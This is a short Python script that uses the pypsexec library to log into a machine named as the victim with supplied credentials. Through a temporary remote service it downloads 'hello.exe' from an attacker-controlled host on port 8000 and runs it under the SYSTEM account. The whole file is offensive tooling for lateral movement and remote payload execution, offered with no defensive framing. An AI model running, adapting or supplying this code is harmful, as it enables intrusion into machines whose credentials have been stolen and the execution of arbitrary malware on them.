from pypsexec.client import Client



def psexe(victim_ip,username,password,attacker_ip):
    c = Client(victim_ip, username=username, password=password)
    c.connect()
    try:
        c.create_service()
        stdout, stderr, rc = c.run_executable("cmd.exe",
                                          arguments="/c Invoke-WebRequest http://"+attacker_ip+":8000/hello.exe -o hello.exe")
        stdout, stderr, rc = c.run_executable("hello.exe", use_system_account=True)
    finally:
        c.remove_service()
        c.disconnect()
